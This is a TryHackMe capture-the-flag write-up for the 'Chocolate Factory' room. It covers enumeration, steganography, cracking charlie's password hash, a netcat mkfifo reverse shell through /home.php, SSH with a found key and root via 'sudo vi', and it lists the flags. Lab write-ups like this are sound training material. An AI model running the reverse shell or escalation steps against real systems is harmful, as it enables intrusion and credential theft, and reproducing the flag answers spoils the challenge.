## Chocolate Factory - TryHackMe Writeup

[Room Link](https://tryhackme.com/room/chocolatefactory)

<i>Welcome to Willy Wonka's Chocolate Factory!

This room was designed so that hackers can revisit the Willy Wonka's Chocolate Factory and meet Oompa Loompa

This is a beginner friendly room!</i>

**IP: 10.10.230.172**

**Replace [YOUR-THM-IP] with your own machine IP assigned by TryHackMe.**

---

## 📌 General Information

**Room Difficulty**: Easy  <br>

**Room Type**: Linux Privilege Escalation, Steganography, Cryptogaphy <br>

**Tools Used**: Nmap, Gobuster, John, Steghide<br>

**Author**: <br>

[<img align='center' src="https://github.com/mauzware/mauzware/blob/main/LOGO%20NEW.png"/>](https://github.com/mauzware)

[TryHackMe Profile](https://tryhackme.com/p/mauzinho) <br>
[GitHub Profile](https://github.com/mauzware)

---

## 🔍 Enumeration

- Starting off with Nmap scan and Gobuster.

  ```
  nmap -sC -sV -T5 -p- 10.10.230.172

  PORT    STATE SERVICE     VERSION
  21/tcp  open  ftp         vsftpd 3.0.3
  | ftp-syst: 
  |   STAT: 
  | FTP server status:
  |      Connected to ::ffff:
  |      Logged in as ftp
  |      TYPE: ASCII
  |      No session bandwidth limit
  |      Session timeout in seconds is 300
  |      Control connection is plain text
  |      Data connections will be plain text
  |      At session startup, client count was 2
  |      vsFTPd 3.0.3 - secure, fast, stable
  |_End of status
  | ftp-anon: Anonymous FTP login allowed (FTP code 230)
  |_-rw-rw-r--    1 1000     1000       208838 Sep 30  2020 gum_room.jpg
  22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey: 
  |   2048 16:31:bb:b5:1f:cc:cc:12:14:8f:f0:d8:33:b0:08:9b (RSA)
  |   256 e7:1f:c9:db:3e:aa:44:b6:72:10:3c:ee:db:1d:33:90 (ECDSA)
  |_  256 b4:45:02:b6:24:8e:a9:06:5f:6c:79:44:8a:06:55:5e (ED25519)
  80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
  |_http-server-header: Apache/2.4.29 (Ubuntu)
  |_http-title: Site doesn't have a title (text/html).
  100/tcp open  newacct?
  | fingerprint-strings: 
  |   GenericLines, NULL: 
  |     "Welcome to chocolate room!! 
  |     ___.---------------.
  |     .'__'__'__'__'__,` . ____ ___ \r
  |     _:\x20 |:. \x20 ___ \r
  |     \'__'__'__'__'_`.__| `. \x20 ___ \r
  |     \'__'__'__\x20__'_;-----------------`
  |     \|______________________;________________|
  |     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
  |_    hope you wont drown Augustus"
  101/tcp open  hostname?
  | fingerprint-strings: 
  |   GenericLines, NULL: 
  |     "Welcome to chocolate room!! 
  |     ___.---------------.
  |     .'__'__'__'__'__,` . ____ ___ \r
  |     _:\x20 |:. \x20 ___ \r
  |     \'__'__'__'__'_`.__| `. \x20 ___ \r
  |     \'__'__'__\x20__'_;-----------------`
  |     \|______________________;________________|
  |     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
  |_    hope you wont drown Augustus"
  [SNIP!]
  ```

  ```
  gobuster dir -u http://10.10.230.172/ -w /usr/share/wordlists/dirb/common.txt -x txt,html,php 

  ===============================================================
  Starting gobuster in directory enumeration mode
  ===============================================================
  /.html                (Status: 403) [Size: 278]
  /.php                 (Status: 403) [Size: 278]
  /.hta                 (Status: 403) [Size: 278]
  /.hta.txt             (Status: 403) [Size: 278]
  /.htaccess.php        (Status: 403) [Size: 278]
  /.htaccess.txt        (Status: 403) [Size: 278]
  /.htpasswd.html       (Status: 403) [Size: 278]
  /.htpasswd.php        (Status: 403) [Size: 278]
  /.htpasswd            (Status: 403) [Size: 278]
  /.hta.php             (Status: 403) [Size: 278]
  /.htpasswd.txt        (Status: 403) [Size: 278]
  /.htaccess            (Status: 403) [Size: 278]
  /.htaccess.html       (Status: 403) [Size: 278]
  /.hta.html            (Status: 403) [Size: 278]
  /home.php             (Status: 200) [Size: 569]
  /index.html           (Status: 200) [Size: 1466]
  /index.html           (Status: 200) [Size: 1466]
  /server-status        (Status: 403) [Size: 278]
  Progress: 18456 / 18460 (99.98%)
  ===============================================================
  Finished
  ===============================================================
  ```
  
- Immediately checked FTP and found the image inside. Download it and extract hidden message from it with `steghide`.

  ```
  ftp 10.10.230.172

  230 Login successful.
  Remote system type is UNIX.
  Using binary mode to transfer files.
  ftp> pwd
  Remote directory: /
  ftp> ls -al
  229 Entering Extended Passive Mode (|||53877|)
  150 Here comes the directory listing.
  drwxr-xr-x    2 65534    65534        4096 Oct 01  2020 .
  drwxr-xr-x    2 65534    65534        4096 Oct 01  2020 ..
  -rw-rw-r--    1 1000     1000       208838 Sep 30  2020 gum_room.jpg
  226 Directory send OK.
  ftp> get gum_room.jpg
  local: gum_room.jpg remote: gum_room.jpg
  229 Entering Extended Passive Mode (|||32400|)
  150 Opening BINARY mode data connection for gum_room.jpg (208838 bytes).
  100% |************************************************************************|   203 KiB  344.45 KiB/s    00:00 ETA
  226 Transfer complete.
  208838 bytes received in 00:00 (318.12 KiB/s)
  ftp> exit
  221 Goodbye.
  
  steghide --extract -sf gum_room.jpg 
  Enter passphrase: 
  wrote extracted data to "b64.txt".
  ```
  
- When you read the TXT file, you'll see long encoded string. Decode it and you will have `/etc/passwd` from the target machine.

  ```
  cat b64.txt       
  ZGFlbW9uOio6MTgzODA6MDo5OTk5OTo3Ojo6CmJpbjoqOjE4MzgwOjA6OTk5OTk6Nzo6OgpzeXM6
  [SNIP!]
  T2J3V0d4Y0hacU8yUkpIa2tMMWpqUFllZUd5SUpXRTgyWC86MTg1MzU6MDo5OTk5OTo3Ojo6Cg==

  cat b64.txt | base64 -d
  daemon:*:18380:0:99999:7:::
  bin:*:18380:0:99999:7:::
  [SNIP!]
  _gvm:*:18496:0:99999:7:::
  charlie:$6$CZJnCPeQWp9/jpNx$khGlFdICJnr8R3JC/jTR2r7DrbFLp8zq8469d3c0.zuKN4se61FObwWGxcHZqO2RJHkkL1jjPYeeGyIJWE82X/:18535:0:99999:7:::
  ```

- Save the hash, start cracking it with `john` and move to exploitation.

  ```
  john --wordlist=/rockyou.txt charlie.hash 
  Using default input encoding: UTF-8
  Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
  Cost 1 (iteration count) is 5000 for all loaded hashes
  Will run 2 OpenMP threads
  Press 'q' or Ctrl-C to abort, almost any other key for status
  cn7824           (?)     
  1g 0:00:04:53 DONE (2025-05-16 15:27) 0.003409g/s 3356p/s 3356c/s 3356C/s cocker6..cn123
  Use the "--show" option to display all of the cracked passwords reliably
  Session completed. 
  ```

---

## ⚙️ Shell Access

- I spent some time on main login page trying to bypass it but it was unseccessful. Well, then I visited `/home.php` and found my way in. Simply put any reverse shell that you like and start a listener.

  ```
  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [YOUR-THM-IP] 4444 >/tmp/f

  nc -lvnp 4444                     
  listening on [any] 4444 ...
  connect to [YOUR_THM_IP] from (UNKNOWN) [10.10.230.172] 46818
  /bin/sh: 0: can't access tty; job control turned off
  $ whoami
  www-data
  $ id
  uid=33(www-data) gid=33(www-data) groups=33(www-data),0(root),27(sudo)
  ```
  
- Change it to putty shell and start looking. Key can be found in `key_rev_key` file.

  ```
  strings key_rev_key
  [SNIP!]
  Enter your name: 
  laksdhfas
   congratulations you have found the key:   
  b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY='
  [SNIP!]
  ```


---

## 🧍 User Privilege Escalation

- OK, I found the first flag but couldn't read it. Thankfully there is a pair of RSA keys in the same directory so that's how we will escalate to user `charlie`. Copy the key to your Kali and connect with it through SSH.

  ```
  cat teleport
  -----BEGIN RSA PRIVATE KEY-----
  [SNIP!]
  -----END RSA PRIVATE KEY-----

  chmod 600 id_rsa
  ssh -i id_rsa charlie@10.10.230.172
  
  [SNIP!]
  
  charlie@chocolate-factory:/$ whoami
  charlie
  charlie@chocolate-factory:/$ id
  uid=1000(charlie) gid=1000(charley) groups=1000(charley),0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
  ```
  
- Perfect, no passphrase needed, read the flag and move to escalation.

  ```
  charlie@chocolate-factory:/$ cat /home/charlie/user.txt 
  flag{cd5509042371b34e4826e4838b522d2e}
  ```

---

## 👑 Root Privilege Escalation

- This one was actually such a cool flag. Escalate to root with `vi`, use `sudo -l` before to confirm it. One-liner can be found on GTFOBins.

  ```
  charlie@chocolate-factory:/$ sudo -l
  Matching Defaults entries for charlie on chocolate-factory:
      env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
  
  User charlie may run the following commands on chocolate-factory:
      (ALL : !root) NOPASSWD: /usr/bin/vi
  
  charlie@chocolate-factory:/$ sudo vi -c ':!/bin/sh' /dev/null
  
  # whoami
  root
  # cat /root/root.txt
  cat: /root/root.txt: No such file or directory
  ```
  
- Since I am doing a lot of these CTFs, by habit I tried to read the flag but it doesn't exist lol. Well, here's the thing, flag is actually a Python file.

  ```
  # cd /root
  # pwd
  /root
  
  # ls -al
  total 40
  drwx------  6 root    root    4096 Oct  7  2020 .
  drwxr-xr-x 24 root    root    4096 Sep  1  2020 ..
  -rw-------  1 root    root       0 Oct  7  2020 .bash_history
  -rw-r--r--  1 root    root    3106 Apr  9  2018 .bashrc
  drwx------  3 root    root    4096 Oct  1  2020 .cache
  drwx------  3 root    root    4096 Sep 30  2020 .gnupg
  drwxr-xr-x  3 root    root    4096 Sep 29  2020 .local
  -rw-r--r--  1 root    root     148 Aug 17  2015 .profile
  -rwxr-xr-x  1 charlie charley  491 Oct  1  2020 root.py
  -rw-r--r--  1 root    root      66 Sep 30  2020 .selected_editor
  drwx------  2 root    root    4096 Sep  1  2020 .ssh
  
  # cat root.py
  from cryptography.fernet import Fernet
  import pyfiglet
  key=input("Enter the key:  ")
  f=Fernet(key)
  encrypted_mess= 'gAAAAABfdb52eejIlEaE9ttPY8ckMMfHTIw5lamAWMy8yEdGPhnm9_H_yQikhR-bPy09-NVQn8lF_PDXyTo-T7CpmrFfoVRWzlm0OffAsUM7KIO_xbIQkQojwf_unpPAAKyJQDHNvQaJ'
  dcrypt_mess=f.decrypt(encrypted_mess)
  mess=dcrypt_mess.decode()
  display1=pyfiglet.figlet_format("You Are Now The Owner Of ")
  display2=pyfiglet.figlet_format("Chocolate Factory ")
  print(display1)
  print(display2)
  print(mess)# 
  ```
  
- This is when I realised why we need that key from before. It was going through my head all the time "Why do I need this key???". Here's why. I order to get the flag, just run the script with Python, it takes one input `key` and that's it.

  ```
  # python root.py
  Enter the key:  b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY='
  __   __               _               _   _                 _____ _          
  \ \ / /__  _   _     / \   _ __ ___  | \ | | _____      __ |_   _| |__   ___ 
   \ V / _ \| | | |   / _ \ | '__/ _ \ |  \| |/ _ \ \ /\ / /   | | | '_ \ / _ \
    | | (_) | |_| |  / ___ \| | |  __/ | |\  | (_) \ V  V /    | | | | | |  __/
    |_|\___/ \__,_| /_/   \_\_|  \___| |_| \_|\___/ \_/\_/     |_| |_| |_|\___|
                                                                               
    ___                              ___   __  
   / _ \__      ___ __   ___ _ __   / _ \ / _| 
  | | | \ \ /\ / / '_ \ / _ \ '__| | | | | |_  
  | |_| |\ V  V /| | | |  __/ |    | |_| |  _| 
   \___/  \_/\_/ |_| |_|\___|_|     \___/|_|   
                                               
  
    ____ _                     _       _       
   / ___| |__   ___   ___ ___ | | __ _| |_ ___ 
  | |   | '_ \ / _ \ / __/ _ \| |/ _` | __/ _ \
  | |___| | | | (_) | (_| (_) | | (_| | ||  __/
   \____|_| |_|\___/ \___\___/|_|\__,_|\__\___|
                                               
   _____          _                    
  |  ___|_ _  ___| |_ ___  _ __ _   _  
  | |_ / _` |/ __| __/ _ \| '__| | | | 
  |  _| (_| | (__| || (_) | |  | |_| | 
  |_|  \__,_|\___|\__\___/|_|   \__, | 
                                |___/  
  
  flag{cec59161d338fef787fcb4e296b42124}
  ```

- I AM NOW THE OWNER OF CHOCOLATE FACTORY, SO COOOOOOOL !!! 🍫 💜

---

## 🏁 Flags

- **Enter the key you found!**: `b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY='`
- **What is Charlie's password?**: `cn7824`
- **User Flag**: `flag{cd5509042371b34e4826e4838b522d2e}`
- **Root Flag**: `flag{cec59161d338fef787fcb4e296b42124}`

---

## 💬 Notes & Reflections

- What was challenging in this room for me?
  `Pretty decent room, nothing more to say.`

- What did I learn?
  `Nothing new, just sharpening my skills.`

- I would recommend this room or any type of CTF challenge to every Cyber Security enthusiast since it will sharpen your skills better than any book/tutorial/course or walkthrough rooms on many different platforms!

- Thank you for reading! Enjoy, Have Fun and Happy Hacking! 🤟

---
